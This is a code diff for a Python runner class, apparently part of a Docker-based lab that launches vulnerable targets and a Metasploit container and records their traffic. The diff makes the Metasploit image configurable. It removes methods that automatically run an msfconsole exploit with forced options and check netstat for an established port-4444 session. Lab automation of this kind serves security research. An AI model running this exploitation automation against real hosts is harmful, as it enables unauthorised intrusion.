@@ -4,18 +4,21 @@ from runners.base import BaseRunner
 class DockerMsfCli(BaseRunner):
     def __init__(self, docker_client, name="target", 
                  network_name="set_framework_net", volume_name="set_logs", 
-                 target_image="", msf_exploit="", msf_options="", delay=0):
+                 target_image="", msf_exploit="", msf_options="", delay=0,
+                 msf_image="metasploitframework/metasploit-framework:6.2.33"):
         super().__init__(docker_client, network_name, volume_name)
         self.target=None
         self.attack=None
         self.tcpdump=None
         #these should be setup on init.  However, should they be cleaned first???
         self.name=name
+        self.target_name=name
         self.target_image=target_image
         self.msf_exploit=msf_exploit
         self.target_logs=None
         self.delay=delay
         self.msf_options=msf_options
+        self.msf_image= msf_image 
         
     def target_setup(self):
         print("[*] Starting vulnerable target %s" % self.name)
@@ -44,49 +47,6 @@ class DockerMsfCli(BaseRunner):
         self.tcpdump.stop()
         self.tcpdump.remove()
 
-    def attack_setup(self):
-        print("[*] Starting attack system for %s" % self.name)
-        dk_attack = self.client.containers.run("metasploitframework/metasploit-framework:6.2.33",
-                                 detach=True, name="%s-attack" % self.name,
-                                 network=self.network, tty=True)
-        self.attack=dk_attack
-
-    def attack_cleanup(self):
-        self.attack.stop()
-        self.attack.remove()
-
-    
-    def exploit(self):
-        cmd = "/usr/src/metasploit-framework/msfconsole"
-        flag = "-x"
-        args = """use %s; %s \
-            set RHOSTS %s; \
-            set LHOST %s; \
-            set ForceExploit true; \
-            set AutoCheck false; \
-            set ExitOnSession false; \
-            exploit"""
-        #cant remember why the second arg is a blank string
-        print("[*] Running exploit for %s" % self.name, end="", flush=True)
-        args = args % (self.msf_exploit, self.msf_options, self.name, "%s-attack" % self.name)
-        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)
-
-    def exploit_success(self):
-        #create check to see if exploit happened.
-        #by default it checks for established connections on 4444
-        #todo: create check customization for other MSF session ports
-        
-        cmd = "netstat |grep 4444 |grep ESTABLISHED"
-        result = self.attack.exec_run(cmd=cmd, tty=True)
-        cmd_result = str(result.output)
-        print('.', end="", flush=True)
-        for line in cmd_result.splitlines():
-            if "4444" in str(line) and "ESTABLISHED" in str(line):
-                print("\n[*] Exploit of %s success" % self.name)
-                return True
-        return False
-
-   
     def ready_to_exploit(self):
         #TODO: add a delay and retries argument similar to exploit_intil_success
         if self.target_logs == None:
